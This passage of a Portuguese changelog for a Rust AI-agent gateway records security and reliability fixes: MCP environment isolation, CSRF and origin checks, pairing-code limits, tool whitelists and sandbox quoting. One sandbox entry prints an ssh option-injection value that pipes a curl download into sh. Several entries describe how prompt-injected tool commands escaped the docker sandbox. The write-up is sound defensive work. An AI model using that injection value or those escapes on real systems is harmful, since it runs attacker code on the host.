  toolchain MSVC nativa do runner ja existe. O caminho mingw cross foi
  descartado com medicao (#1253).
- A doc agora diz explicitamente que o hardening de permissoes de arquivo
  e so Unix: `config.yml` no Windows herda a ACL default do diretorio, e os
  modos `0600`/`0700` da sessao WhatsApp nao se aplicam la (#1253).
- **O `git_diff` e o `code_review` respondiam sobre o repositorio errado.** As duas tools
  montavam o `Command::new("git")` sem `current_dir`, entao o git herdava o diretorio de
  trabalho do *processo do gateway* em vez do `working_dir` da sessao que pediu a tool: uma
  sessao com projeto em A recebia o diff do repositorio onde o gateway subiu — ou
  "not a git repository", quando aquele diretorio nao era repositorio nenhum. Pior que a
  resposta errada, o resultado nao era reproduzivel entre instalacoes: o diretorio do
  processo depende de como ele subiu (`garra start` num terminal, unidade systemd com
  `WorkingDirectory=`, sidecar do desktop, container), de modo que o mesmo prompt, na mesma
  sessao, dava resposta diferente sem nada no pedido explicar a diferenca. Agora o git roda
  no `working_dir` da sessao quando ha um; sem ele — o caso comum, porque um prompt de canal
  nao traz projeto — o diretorio do processo e mantido, mas a resposta passa a **dizer de
  qual repositorio ela falou**, porque a resposta errada silenciosa era o defeito real.
  Um `working_dir` que nao existe falha nomeando o diretorio em vez de cair de volta no
  diretorio do processo. Os testes exercitam as tools pelo caminho do agente (`execute` com
  `ToolContext`) contra dois repositorios temporarios, e nao pela funcao interna. No
  `code_review`, de carona e no espirito do #1269, o `commit_range` (que vem do modelo e e
  argumento argv) passou a ser recusado quando comeca com `-` (`--output=...` escreveria
  arquivo, `--stdin` penduraria o filho ate o timeout) e o filho git nao le mais a entrada
  padrao do gateway.
- **O ledger CodeQL passou a ancorar por conteudo, nao por numero de linha
  (#1263).** `check-ledger-anchors.py` procura o `sink_snippet` no arquivo e
  DERIVA a linha, em vez de le-la do JSON e comparar. Antes, qualquer commit
  que acrescentasse ou removesse linhas ACIMA de um sink derrubava o gate sem
  encostar no statement suprimido — a entrada #113 andou duas vezes no mesmo
  PR (#1252), `:769` para `:826` para `:867`, sem o snippet mudar um byte, e
  cada rodada custou uma fila de ~110 jobs. Pior: o caminho mais rapido para
  ficar verde era editar o `sink_snippet` ate casar com a linha, o que e
  fraudar o registro de auditoria. Agora o gate fica vermelho em um caso so: o
  statement mudou, sumiu, ou ficou ambiguo. `line` virou campo derivado e o
  proprio checker o reescreve no `.json` e na coluna `File:line` do `.md`,
  dizendo `linha derivada X (antes Y)`; no CI ele roda com `--no-rewrite` e so
  reporta. Snippet com 2+ ocorrencias no arquivo agora e erro explicito de
  configuracao, resolvido por uma ancora auxiliar de conteudo
  (`"disambiguator": {"kind": "function", "value": "<fn envolvente>"}`) e nunca
  por ordinal, que reaponta em silencio quando aparece um statement identico
  acima — 13 das 30 entradas precisaram disso. De brinde, as citacoes
  `arquivo:linha` dentro das justificativas passaram a ser conferidas: era por
  falta disso que um drift sobrevivia escondido num documento de auditoria de
  seguranca (a justificativa do #113 citava `:630` e `:643` quando o codigo
  estava em `:824` e `:837`).
- **Ferramenta de servidor MCP ignorava a whitelist do modo do agente** (#1264).
  O `ToolGate::permite` isentava qualquer nome que contivesse o separador `__`
  — a whitelist era consultada, e a isencao nao: modo somente-leitura
  (`search`/`architect`/`debug`/`review`/`edit`) deixava passar ferramenta de
  escrita de um servidor MCP conectado. Agora a permissao e **declarada**:
  `whitelist_mode` vale para MCP, e a sintaxe `servidor/*` na `allowed`
  libera o servidor inteiro (`meu-servidor/*` cobre `meu-servidor__<qualquer
  nome>`); nome completo libera so aquela ferramenta; `denied` continua
  vencendo tudo, prefixo incluso. `whitelist_mode = true` com `allowed` vazia
  continua **permitindo tudo** (opcao (b), compatibilidade) — mas o runtime
  emite aviso por turno nesse caso, e o aviso de ferramenta MCP escondida
  diz o nome e a sintaxe que libera. Os testes exercitam o portao que o
  runtime monta de verdade (`ModeProfile::from_custom` + `ToolGate::
  para_o_turno`) e o turno completo do runtime; a mutacao da isencao de volta
  derruba 3 testes.
- **Filhos de `run_tests` e `bash` nao herdam mais o stdin do gateway
  (#1270).** A varredura sistematica de argv injection que a #1270 pedia
  (sign-off do PR #1268) inventariou as 14 chamadas de `std::process::Command`
  nas tools e achou um achado novo da mesma familia que o #1269 fechou no
  `git_diff`/`code_review`: o filho de `repo_search`, `git_diff` e
  `code_review` ja rodava com stdin fechado, mas o de `run_tests` (nos cinco
  frameworks) e o do `bash` herdavam o stdin do processo do gateway — em
  terminal, um `cat` sem argumento no comando rouba o que o operador digitou,
  e o comportamento dependia de como o processo subiu (`garra start`, systemd,
  sidecar, container). Agora os dois fecham o stdin (`Stdio::null()`), com
  guard que varre o fonte (padrao do `spinner.rs`) e o inventario completo
  das tools no threat-model §5.72. Zero achados de argv injection: todas as
  tools que montam linha de comando ja seguem o padrao do #1268 (terminador
  `--` ou valor colado na opcao).
- **Uma escrita de admin nao apagava mais o que os outros servidores declaravam em `mcp.json`.**
  O gateway mantinha dois tipos com o mesmo nome para o mesmo arquivo: o `McpServerConfig` do
  `garraia-config` (que o boot le) carregava `allowed_tools`, `inherit_env` e `enabled`, mas o
  `McpServerConfig` do registry — o que `save_from_registry` serializa de volta para o arquivo a
  cada POST/DELETE em `/admin/api/mcp` — nao carregava nada disso. Uma unica criacao ou remocao
  de servidor pela admin API reescrevia o `mcp.json` sem a allowlist GAR-190 de TODOS os
  servidores do arquivo (a sonda do corpo da issue provava: apos um `add_server` +
  `save_from_registry`, `allowed_tools` tinha saido do disco). O mesmo defeito derrubava o
  `inherit_env` (#1075), a chave de boot `enabled` — um servidor desligado religava no proximo
  boot — e o tuning snake_case (`memory_limit_mb`, `max_restarts`, `restart_delay_secs`), que o
  registry nem lia. O tipo do registry agora carrega os tres campos, com aliases de leitura que
  fazem os dois lados concordarem em um schema so: `allowed_tools` e `inherit_env` sao gravados
  na grafia snake_case canonicamente lida pelo boot, e o tuning snake_case escrito a mao agora
  sobrevive ao round-trip. `POST /admin/api/mcp` passa a aceitar `allowed_tools`, e o `GET`
  expoe `allowed_tools` e `inherit_env`. O timeout continua sem alias camelCase no loader de
  proposito: ler o `timeoutSecs: 30` default do writer sobrescreveria
  `timeouts.mcp.default_secs` em servidores em que o operador nunca escolheu um timeout. O
  restart da admin API mantem o isolamento forcado de ambiente (#1075) — o campo agora viaja no
  tipo, mas honrar a declaracao no restart e mudanca de stance propria.
- **O `serve` do WhatsApp vinculado nao via o caso "conectou e emudeceu".**
  Os relogios do driver so valiam antes do `connected` — com razao: depois
  dele, silencio e o estado normal de uma conta sem mensagens, e cortar por
  silencio derrubaria o canal saudavel toda madrugada. Uma ponte que
  conectava, entregava a sessao e parava de falar sem fechar o stdout e sem
  morrer ficava morta em silencio para sempre: sem queda visivel, sem
  reconexao, sem ninguem olhando um terminal. O conserto e prova de vida no
  protocolo, nao mais um prazo: depois do `connected` o driver manda `ping`
  a cada `ServeOptions::ping_every_secs` (15 s em producao) e exige resposta
  — qualquer evento, e um `pong` explicito — dentro de
  `ServeOptions::pong_deadline_secs` (45 s em producao). Prazo vencido cai em
  `ServeExit::Dropped { was_connected: true }`, e o backoff que ja existia
  assume. Um bridge de versao anterior que nao conhece `ping` responde com o
  evento `error` de comando desconhecido — que tambem prova vida e por isso
  tambem serve. A fixture ganhou o cenario `serve-wedge` (conecta, entrega a
  sessao e para de falar e de ler o stdin), exercitado pelo driver.
- **A varredura de segredo do canal whatsapp-linked deixava todo `impl`
  gerado por `macro_rules!` passar.** A regra que proibe `SessionBlob` de
  ganhar conversao nova para `&str` olhava so para `impl` cuja linha contém
  "SessionBlob"; uma macro que gera `impl ::core::convert::AsRef<str> for $t`
  nao tem a palavra na linha do `impl` e chegava 111/111 verde. A regra agora
  e invertida (todo-impl): TODO `impl` de `session.rs` tem de estar na
  allowlist fechada `IMPL_ALLOWED` (9 entradas — as 4 originais de `SessionBlob`
  mais as 5 de `KeyOrigin`/`SessionKey`/`SessionStore`/`SessionError`),
  indentacao e cortada antes da comparacao, e o caso negativo entra como texto
  plantado — macro de ataque do issue, `impl Deref` manual a mao e `impl`
  indentado dentro de `mod` sao reportados; os 9 impls reais de producao
  confirmam que a allowlist continua viva.
- **Loop detector: o erro de tool em loop traz o diagnostico do input repetido (#1295, item 2 de 3).**
  Em vez do seco "tool loop detected: <tool>", o erro agora leva o nome da
  ferramenta, a contagem da janela (3 chamadas identicas em sequencia) e o
  input repetido — e quem le (o humano no log, no ledger de runs ou no
  cartao da CLI) tem como corrigir. O input sai pela mesma allow-list do
  `summarize_tool_input` (#937): o campo que interessa da ferramenta
  (`command`, `path`, `url`...), redigido e truncado; ferramenta sem caso
  proprio mostra so os nomes das chaves e o tamanho, nunca valor — o erro e
  persistido e exibido, e um `{"password": ...}` de tool nova nao tem
  formato que o redactor reconheca. A mensagem nasce num unico lugar
  (`ExecutionBudget::mensagem_de_loop`) e passa pelo despacho unico do
  #1311; o gatilho (3 assinaturas identicas) nao mudou.
- **Tools nativas devolviam `Err(Error::Agent(...))` em parâmetro obrigatório
  ausente.** Quatorze pontos de validação em dez tools (`file_read`,
  `file_write`, `bash`, `web_fetch`, `web_search`, `git_diff`, `device_read`,
  `device_execute`, `schedule_heartbeat`, `schedule_recurring`) tratavam
  chamada malformada do modelo como erro fatal de turno: o dispatch do
  runtime converte o `Err` em texto com o prefixo enganoso `agent error:` e
  sem orientação de schema, e caminhos sem amortecimento (orquestrador)
  falham o step inteiro. Agora toda ausência/tipo errado de parâmetro volta
  como observação soft (`Ok` + `is_error`) com mensagem que nomeia o
  parâmetro, o schema da chamada e pede o reenvio — o modelo se autocorrige
  no mesmo turno, no padrão que `list_dir` e `channel_send` já seguiam.
  `Err` fica reservado a falha ambiental real (IO, permissão, jail,
  recusa de política).
- `/model` no chat agora e transacional: valida o identificador contra o
  catalogo real do provider (nova surface `validar_modelo` em `LlmProvider`;
  o OpenRouter consulta a lista completa `GET /models`, nao a curada de
  populares) antes de alterar o estado. Modelo ausente, provider sem resposta
  ou erro de rede recusam a troca e mantem provider/model anteriores, com
  mensagem dizendo o estado vigente. Rota valida fora da lista curada (ex.:
  `z-ai/*`, o padrao do ADR 0022) aplica com nota explicita de que nao vem do
  `/models`; provider sem catalogo aplica com ressalva de troca nao validada.
- **OpenRouter 404 `No allowed providers are available` chegava como erro cru
  do provider.** A preferencia `provider.only` em vigor (sufixo `:provider`
  no slug do modelo ou preferencia da conta) sem intersecao com os providers
  que servem o modelo condena a requisicao antes de sair, mas a mensagem nao
  dizia o que configurar. Os dois caminhos do provider OpenAI-compativel
  (batch e streaming) agora classificam essa assinatura como erro de
  configuracao de roteamento nao-transitorio, com modelo, restricao efetiva
  (`permits only:`), providers compativeis e caminho de recuperacao
  (`/model <outro-modelo>` ou ajuste da preferencia na conta OpenRouter — o
  Garra nao altera `provider.only` por conta propria). O classificador de
  retry do runtime trata a assinatura como nao-retryable, inclusive se o
  texto carregar um numero de status retryavel no meio (#1299).
- O chat agora grava a pergunta ANTES do turno rodar e grava um marcador
  explicito (`[turno interrompido: timeout|cancelado|erro]`) quando o turno
  acaba sem resposta. Um crash, timeout ou Ctrl+C nao apaga mais o turno do
  ponto de vista do `--resume`: a sessao restaurada termina na pergunta
  interrompida, com o motivo marcado. `garraia chat --resume` sem valor (ou
  `--resume latest`) retoma a sessao com a atividade mais recente do CLI
  (nova query `latest_session_id` no SessionStore, isolada por canal), e o
  novo comando `/resume [id]` do REPL faz o mesmo sem reiniciar, avisando
  quando o ultimo turno terminou interrompido.
- O REPL interativo (`garra chat` ou `garra`) nao exibe mais linhas cruas de
  tracing (`WARN garraia_agents::...`) no terminal: retry, fallback e circuit
  breaker do provider ficam em silencio no console padrao, porque a falha de
  turno ja vira cartao de erro acionavel. `garraia.log` continua recebendo
  tudo, e `--verbose`, `--debug` ou `RUST_LOG` explicito vencem o silencio
  como antes (#1301).
- CodeQL: `codeql-reapply-dismissals.sh` compara a linha do ledger contra o span do statement no alerta (start..end) em vez de exigir igualdade com o start_line, porque statements multi-linha (o `println!` do alerta 173) separam o inicio do statement da linha do sink ancorada; rule_id e path continuam casando exatamente.
- Bridge WhatsApp: `materialize` agora valida o nome de cada asset contra uma accept-list de unico segmento de arquivo antes de qualquer escrita em disco, fechando o path-injection apontado pelo CodeQL (alerta 174) para qualquer implementacao futura de `BridgeAssets` — nomes como `../escapou`, path absoluto, separador de Windows e NUL viram `BridgeError::AssetName`.

### Security
- **Servidor MCP stdio deixa de herdar o ambiente inteiro do gateway (completa
  o hardening da #1075; sandbox do processo segue na #1225).** Ate agora o
  `McpManager::connect` montava o `Command` do processo filho sem
  `env_clear()`. Consequencia direta: todo servidor MCP recebia, no proprio
  ambiente, `GARRAIA_JWT_SECRET`, `GARRAIA_REFRESH_HMAC_SECRET`, as chaves de
  provider (`ANTHROPIC_API_KEY`, `OPENROUTER_API_KEY`, ...),
  `GarraIA_VAULT_PASSPHRASE`, `DATABASE_URL` e qualquer outra variavel que o
  `dotenvy` tivesse carregado do `.env`. O mapa `env` da config era aplicado
  POR CIMA dessa heranca, nao no lugar dela, entao declarar `env` nunca
  restringiu nada.
  O que torna isso grave no MCP e a origem do binario: um servidor MCP e
  tipicamente um pacote de terceiro resolvido na hora (`npx -y algum-server`),
  e ler `std::env` no proprio `main()` nao exige tool call, prompt injection
  nem rede do agente — basta ser spawnado. O #1075 ja tinha fechado esse mesmo
  buraco para as tools de shell (`bash_tool`, `run_tests`, `git_diff`,
  `code_review`, `repo_search`) com a `R3_ENV_ALLOWLIST`; o caminho MCP ficou
  de fora, e uma varredura por `env_clear` no repositorio nunca encontrava o
  `manager.rs`.
  Agora o ambiente do filho e construido do zero, nesta ordem: allowlist
  minima do ambiente do gateway (`PATH`, `HOME`, locale, `TMPDIR`, `TZ`,
  bundles de CA, mais o complemento de plataforma — `SystemRoot`/`COMSPEC`/
  `APPDATA` no Windows, `PREFIX`/`LD_PRELOAD` no Termux) e, por cima, o mapa
  `env` daquele servidor, que e onde o operador coloca de proposito o
  `GITHUB_TOKEN` e afins. A allowlist MCP e um superset deliberado da R3 e vive
  ao lado dela em `garraia_common::safety_gate`: um servidor MCP e um programa
  completo (`npx`/`uvx`/`python`) e precisa de cache, temp e locale so para
  subir, enquanto a R3 serve um comando de shell efemero — fundir as duas faria
  qualquer afrouxamento aqui afrouxar junto o `bash_tool`. Variaveis de proxy
  (`HTTP_PROXY`/`HTTPS_PROXY`) ficaram de fora de proposito, porque a URL pode
  embutir usuario e senha.
  A valvula de escape e `inherit_env: true` por servidor no `config.yml` /
  `mcp.json` (default `false`): devolve ao filho o ambiente completo, emite
  `warn!` nomeando o servidor no primeiro connect (reconnects automaticos caem
  para `debug!`, para nao afogar o log de um servidor em loop de restart) e
  nunca registra nome nem valor de variavel. Ela existe para destravar um
  servidor legado enquanto o operador migra a variavel para o mapa `env`, e
  nao esta disponivel na admin API — servidor criado OU reiniciado por ali
  conecta sempre isolado, mesmo que o `config.yml` declare `inherit_env: true`
  para aquele nome. A politica viaja junto dos parametros de conexao, entao um
  reconnect automatico do proprio gateway nao a troca em silencio.
  Nota para quem for escrever `env` no `config.yml`: referencias
  `vault:<chave>` sao resolvidas apenas no caminho `mcp.json` + admin API
  (`McpPersistenceService::load_registry`). No boot do `config.yml`
  (`ConfigLoader::merged_mcp_config`) o valor e copiado como esta, entao um
  `vault:...` escrito ali chega ao filho como a string literal. Issue #1237.
  A lacuna era de teste tanto quanto de codigo: o fixture de MCP agora expoe,
  atras da flag `--expose-env`, uma tool que relata o ambiente que o filho de
  fato recebeu, e os testes plantam uma variavel no processo de teste e afirmam
  que ela NAO chega ao filho por padrao, que chega com `inherit_env: true`, e
  que o mapa `env` explicito chega e vence a heranca.
- **Pagina web qualquer nao dispara mais POST/PATCH/DELETE contra o gateway local (#1182).**
  `/api/*` e auth-free por desenho — "quem alcanca a porta e o dono" — mas o navegador
  do dono alcanca a porta rodando codigo de terceiros: bastava ele visitar uma pagina
  para ela mandar `PATCH /api/settings`, `POST /api/mode/select`,
  `POST /api/mcp/marketplace/install`, `POST /v1/chat/completions` (gastando a chave de
  LLM dele), `DELETE /api/memory` ou `POST /admin/api/setup` (que cria o primeiro admin
  numa instalacao nova e nao tinha CSRF proprio) contra `127.0.0.1:3888`. O #1093 tinha
  fechado so `/api/learning/*`; agora a guarda e generica
  (`garraia_gateway::origin_guard`) e cobre toda a superficie mutante, com a mesma
  comparacao estrita de `Origin` contra o transporte e o `Host`, mais uma ancora
  anti-DNS-rebinding que aceita IP literal, `localhost`/`*.localhost` ou nome declarado
  em `gateway.allowed_origins`. Em HTTP/2 o `Host` vem da `:authority`, entao o console
  servido com TLS nativo continua passando.
- **CORS default deixa de ser allow-all (#1182).** `gateway.allowed_origins` vazio (o
  default de instalacao) anunciava `Access-Control-Allow-Origin: *`, entao a pagina do
  atacante nao so disparava a escrita como lia a resposta — `/api/settings/effective`
  inteiro, por exemplo. Agora vazio significa nenhuma origem cross-origin. O Web Console
  e servido pelo proprio gateway e e same-origin (nao usa CORS); cliente nao-navegador
  (app mobile, `curl`, Claude Code) ignora CORS. Uma entrada `*` na lista e ignorada com
  aviso em vez de derrubar o gateway no boot.
- **`/ws` e `/ws/parrot` passam a checar o `Origin` do handshake (#1182).** WebSocket nao
  passa por CORS, entao `new WebSocket("ws://127.0.0.1:3888/ws/parrot")` de qualquer
  pagina abria um turno completo do agente — com as tools, com a chave de LLM do dono,
  escrevendo na sessao persistente do Garra Desktop e lendo a resposta de volta; a rota
  nem tinha gate de `api_key` (ele cobre so `/api/*`). Handshake sem `Origin` (app, CLI,
  `curl`) segue como antes. A webview Tauri do desktop passa pela sua origem exata
  (`tauri://localhost`; `http://tauri.localhost` so num gateway Windows, porque o Safari
  entrega `*.localhost` ao resolvedor do sistema — `origin_guard::ORIGENS_TAURI` e
  `ORIGENS_TAURI_WEBVIEW2`, derivadas do fonte do Tauri 2.11 e nao medidas em runtime
  nesta entrega; se o passaro parar de conectar, o log diz `gateway: cross-origin
  request refused` com `path=/ws/parrot`). Pelo mesmo motivo a ancora anti-rebinding
  aceita `localhost` exato, nunca `*.localhost`. Residual registrado
  em `docs/security/threat-model.md` secao 5.10: leitura `GET` sob DNS rebinding nao e
  fechada por regra de `Origin` (o navegador nao manda `Origin` em GET same-origin);
  a mitigacao e `gateway.api_key`.
- **Codigo de pareamento ganha limite de tentativas, comparacao constant-time e avisos
  ao dono (#1191).** O codigo do `/pair` tem 6 digitos (~20 bits) e quem acerta entra na
  allowlist em disco; ate o #1190 o `claim()` nunca rodava em producao, e quando a
  fiacao foi consertada tres fragilidades antigas de `garraia_security::PairingManager`
  passaram a ser alcancaveis. Agora: (1) cada usuario que erra 5 vezes fica 15 minutos
  sem poder tentar (`LockedOut`, sem nem comparar e sem contar no global), e 20 erros
  comparados de qualquer usuario desde o ultimo `/pair` queimam todo codigo pendente
  (`Burned`) — 20 palpites em 10^6 da 2e-5 por ciclo; um `/pair` em outro canal nao zera
  o contador enquanto um codigo pendente sobrevive; (2) a comparacao usa
  `subtle::ConstantTimeEq` e percorre todos os codigos sem sair no primeiro; (3)
  `generate_with_status` devolve `GenerateStatus { code, replaced_pending, previous_burned }`
  e o `/pair` avisa tanto quando substituiu um codigo ainda nao resgatado quanto quando
  os codigos foram queimados desde o ultimo `/pair` (e com quantos erros) — sem isso a
  queima era invisivel: o canal descarta em silencio e o convidado parece ter errado.
  `claim()` mantem a assinatura `Option<String>` (os 11 canais nao mudam) e o usuario
  bloqueado ve o mesmo "unauthorized" de sempre — a resposta nao revela se o codigo
  existia. Limites em `ClaimLimits` (`PairingManager::with_limits`). Trade-off
  documentado no threat model 5.11: em canal de identidade gratis (IRC sem NickServ,
  alts de Discord) um atacante persistente consegue queimar cada codigo novo — DoS do
  pareamento, nao do bot — e o dono fica sabendo pelo `/pair`. Fica de fora, de
  proposito: escopar o codigo pelo canal de origem (`claim()` segue ignorando o
  `channel_id`) — a allowlist e global por instalacao e isso e decisao de produto.
- **`deny.toml` fecha o ignore de RUSTSEC-2024-0388 (`derivative` unmaintained), residual do bump do poise 0.6.2 -> 0.7.0 (#1202).** O poise 0.7.0 trocou `derivative` por `derive-where`; a crate sumiu do `Cargo.lock` e o `ignore` correspondente virou configuracao morta suprimindo um advisory que ja nao se aplica — o tipo de entrada que depois esconde uma reintroducao real. Sem espelho em `.cargo/audit.toml` (o ID nunca esteve la). Comentario de `Cargo.toml` sobre a feature `native_tls_backend` do poise atualizado de `0.6.x` para `0.7.x` (so o numero mudou, a razao documentada continua valendo).
- **`rustls` atualizado para 0.23.45, corrigindo RUSTSEC-2026-0285 (#1206).** O
  advisory (TLS 1.3 handshake messages aceitas incorretamente entre fronteiras
  de nivel de criptografia, severidade 5.3/medium) foi publicado em 2026-09-14
  contra a versao `0.23.40` ja fixada no `Cargo.lock`. Bump transitivo via
  `cargo update -p rustls --precise 0.23.45` (dependencia de `reqwest`/
  `rustls-tls` usada pelo gateway e pelas crates que fazem chamadas HTTP de
  saida); `aws-lc-rs`/`aws-lc-sys`/`rustls-webpki` acompanharam a atualizacao.
- **O sandbox por tool passa a conter o comando de verdade — metacaractere de
  shell nao escapa mais para o host (correcao da #1222).** A primeira versao do
  `SandboxPolicy::wrap_command` montava a linha do `docker run` citando o
  comando com `{:?}`, o `Debug` do Rust. `escape_debug` parece quoting mas nao
  e: ele escapa `"`, `\` e caracteres de controle, e nao toca em `$` nem em
  crase. Como o `BashTool` entrega a linha inteira ao shell do host
  (`sh -c <linha>`), um comando contendo `$(...)` ou crase era expandido pelo
  **host**, antes de o `docker run` sequer existir. O container recebia apenas
  o resultado da expansao.
  O efeito e o oposto do proposito da funcionalidade: `--network none`,
  `--security-opt no-new-privileges` e o mount do workdir seguiam todos
  presentes na linha de comando e todos irrelevantes, porque o comando do
  atacante nunca chegava a entrar no container. E a entrada e alcancavel: o
  comando vem de tool call do LLM, que o proprio projeto ja trata como
  influenciavel por injecao indireta de prompt (#1213). Fail-closed quando o
  backend falta, fail-open no conteudo do comando — a combinacao pior, porque
  o operador liga `mode: all` e passa a confiar numa contencao que nao existe.
  O mesmo valia para o `cwd`, interpolado sem aspas em `-v {cwd}:{cwd}`: um
  diretorio com `;` virava comando extra no host, e um com espaco simplesmente
  quebrava o `docker run`.
  Agora `command`, `cwd`, `image` e o host do `ssh` passam por `sh_quote`,
  quoting POSIX com aspas simples (`'\''` para a aspa interna) — dentro de
  aspas simples o shell nao expande nada. O ramo `ssh` leva **duas** camadas,
  porque o `ssh` nao entrega argv ao host remoto: ele remonta uma string que o
  shell remoto reparseia, entao uma camada morre em cada lado.
  A lacuna real era de teste: os onze testes existentes afirmavam que as flags
  de hardening estavam presentes na string, e nenhum afirmava que um
  metacaractere ficava **inerte**. Os novos testes executam a string por um
  shell de verdade e conferem que o comando chega como uma unica palavra
  literal — inclusive um que falha de proposito se alguem "simplificar" o
  quoting duplo do `ssh`.
  De quebra, `fail_closed_backend_ausente` deixou de depender de haver cliente
  `ssh` instalado: ele fazia `.unwrap()` no retorno e quebrava em qualquer
  maquina sem ssh; agora asserta explicitamente os dois desfechos possiveis,
  em vez de pular em silencio.
- **`agent.sandbox.mode = all` passa a dizer o que NAO cobre (#1225 S2, parte segura).**
  O docstring de `SandboxMode::All` prometia "toda tool shell-listada roda no sandbox", e
  so o `BashTool` consulta a policy: `run_tests` (cargo/flutter/npm/python), `git_diff`,
  `code_review` e `repo_search` spawnam no host sem olhar `mode` nenhum. Quem ligava `all`
  esperando "nada roda no host" estava enganado sobre quatro tools, e fora de um paragrafo
  do threat model nada no produto dizia isso. Agora a lista e uma constante publica
  (`garraia_agents::sandbox::HOST_ONLY_SPAWNING_TOOLS`, espelhada em
  `garraia_config::sandbox::TOOLS_SO_NO_HOST` porque config nao depende de agents), dita
  em tres lugares que o operador ve: os docstrings de `SandboxMode::All`/`Allowlist`; um
  `warn!` unico por processo (`avisa_cobertura_do_sandbox`) na subida do gateway, do
  `garra chat` e do `garra mcp-server` com a tool `garra_agent` ligada (so nomes de tool,
  nenhum valor de config) — separado da construcao da policy de proposito, porque no MCP
  `sandbox_policy_from` roda a cada chamada de `garra_agent` e o aviso sairia por chamada;
  e um Warning do `garra config check` quando uma dessas quatro aparece em
  `sandboxed_tools`/`elevated`, nomeando a tool, o que o sandbox cobre e o proximo passo.
  So quando listada: `--strict` promove Warning a exit 2, e a secao recomendada
  (`mode = all` + docker) continua saindo com exit 0.
  A constante e presa por um teste que varre `crates/garraia-agents/src/tools/`: toda tool
  com `Command::new` em codigo de producao tem de estar na lista OU chamar
  `sandbox.wrap_command(`, e nada pode estar nas duas. Quando a metade estrutural da S2
  rotear uma delas pelo sandbox, o teste obriga a tira-la da lista — e a documentacao nao
  volta a prometer o contrario do codigo. Um segundo teste, no gateway (a unica crate que
  ve as duas), confere o espelho da config. Rotear as quatro tools pelo sandbox continua
  na #1225.
- **Sandbox: valor de config que comecaria com `-` deixa de virar OPCAO do `ssh`/`docker`
  (#1225).** O `sh_quote` da #1231 garante que o comando chegue como **um token** — o que
  barra injecao de comando e nao barra injecao de *opcao*. Na linha
  `ssh {host} -- sh -lc …` o host fica **antes** do `--`, entao um
  `agent.sandbox.ssh_host: "-oProxyCommand=curl http://x|sh"` continua sendo um token so e
  o `ssh` o le como flag: o comando do atacante executa no host **local**, ja depois de o
  `safety_gate` ter aprovado outra coisa. O mesmo vale para `agent.sandbox.image`, que e
  posicional do `docker run` e desloca tudo que vem depois.
  Nenhum host de verdade e nenhuma imagem de verdade comeca com `-`, entao a defesa e
  recusar, em tres camadas: o `sandbox_policy_from` nao constroi backend nenhum (imagem
  cai no default) com um `warn!` que **nunca** loga o valor, o proprio `wrap_command`
  recusa fail-closed, e o `garra config check` reporta Error — este ultimo e comando
  opt-in, nao gate de boot (nada no boot do gateway chama o `run_check`), entao quem
  garante a propriedade sao as duas primeiras, que rodam sempre. O guard do wrap fica antes do
  `is_available()`, para que num host sem cliente `ssh` o erro de backend ausente nao
  mascare o de injecao de opcao. O conserto estrutural, montar argv em vez de uma linha de
  shell, fica como tracking na #1225 (slices S2/S3), como ja recomendado na #1231.
- **Sandbox fora de unix passa a falhar fechado (#1225).** O `BashTool` escolhe
  `powershell -Command` no Windows e receberia uma linha com quoting POSIX, que o
  PowerShell nao reparseia da mesma forma (la a aspa simples escapa como `''`). Antes isso
  era so uma nota de documentacao: a contencao parecia ligada e nao continha. Agora o
  `wrap_command` devolve erro e o `config check` reporta Error quando a secao esta ligada
  em `cfg!(windows)`.
- **Sandbox que esta ligado e inerte passa a ser reportado (#1225).** Aviso quando
  `mode: all` tem `bash` em `elevated` — como so a tool `bash` e envolvida hoje, isso
  equivale a `mode: off` com passos extras — e quando uma entrada de `sandboxed_tools` ou
  `elevated` nao e uma tool que o sandbox saiba envolver; o finding nomeia a entrada,
  porque apontar o typo (`Bash`, `run_tests`) e a razao de ele existir. Nomes agora sao
  trimados na conversao, entao `" bash"` vindo de uma lista YAML deixa de ser um item que
  existe no arquivo e nao existe para o codigo; caixa NAO e normalizada, porque o registry
  de tools e case-sensitive e "consertar" escondia o erro.
- **O aviso de que `backend: ssh` nao e contencao virou incondicional (#1225).** Antes so
  aparecia junto com `network_disabled`/`mount_workdir` ligados; quem desligava os dois
  passava a ver um `config check` limpo para uma configuracao que executa comandos numa
  maquina remota com rede e disco inteiros. A palavra "sandbox" na chave promete o que
  este backend nao faz, entao o operador le isso uma vez sempre.
- **Comando do sandbox deixa de ir inteiro para o log (#1225).** O caminho sandboxado
  virou alcancavel com esta serie, e o que ele registrava era a linha de shell crua
  escrita pelo LLM — que o projeto ja trata como influenciavel por injecao indireta de
  prompt (#1213) e que pode carregar credencial. Agora ela passa por
  `garraia_security::redact_secrets`, tem todo caractere de controle neutralizado e e
  truncada em 120 chars (nessa ordem: truncar antes poderia partir uma sequencia ANSI ao
  meio e deixar um OSC sem terminador, e ai o terminal de quem le o log engole as linhas
  seguintes).
  **O que a redacao NAO cobre, dito aqui para ninguem ler garantia onde ha ressalva:** o
  `redact_secrets` e lista fechada de formatos conhecidos (`sk-`, `ghp_`, `xoxb-`, JWT,
  AKIA, Telegram, senha em connection string). Segredo em formato generico — senha passada
  por flag, variavel de ambiente com valor opaco, cabecalho com token nao reconhecivel —
  passa inteiro, e o unico limite que sobra e a truncagem. Por isso o caminho de sucesso
  loga em `debug!` e nao em `info!`: ate esta serie ele era inalcancavel, entao em `info!`
  todo comando sandboxado passaria a ir para o log no nivel padrao, o que seria exposicao
  nova. O `error!` do fail-closed fica, porque ali o evento e a recusa.
- **O sandbox por tool passa a ser alcancavel pelo operador — `agent.sandbox`
  (#1225).** A contencao entregue na #1222 (e corrigida na #1231) existia
  inteira: `SandboxPolicy`, `SandboxMode`, `SandboxBackend`, `wrap_command`
  com quoting POSIX, fail-closed quando o backend falta, e onze testes
  unitarios verdes. E nenhuma instalacao conseguia liga-la. Os tres
  construtores de producao do `BashTool` fixavam `SandboxPolicy::default()`
  (= `off`), `set_sandbox_policy` so era chamado pelos proprios testes do
  modulo, e a chave de config que as mensagens de erro citavam
  (`tools.sandbox.backend`, `tools.sandbox.mode`) nao existia em lugar nenhum
  do schema — `grep -ri sandbox crates/garraia-config/src/` nao devolvia nada.
  Uma funcionalidade de seguranca que so os testes dela conseguem exercitar
  nao e uma funcionalidade; e uma que parece existir no changelog.
  Agora ha a secao `agent.sandbox` (`mode`, `backend`, `image`, `ssh_host`,
  `sandboxed_tools`, `elevated`, `mount_workdir`, `network_disabled`), lida
  nos tres pontos de producao pela MESMA funcao
  (`garraia_gateway::bootstrap::sandbox_policy_from`), como ja acontece com
  os adapters de hardware: gateway, `garra chat` e `garra mcp-server` (tool
  `garra_agent`) nao podem discordar sobre onde um comando roda. O caminho MCP
  e o que mais ganha —
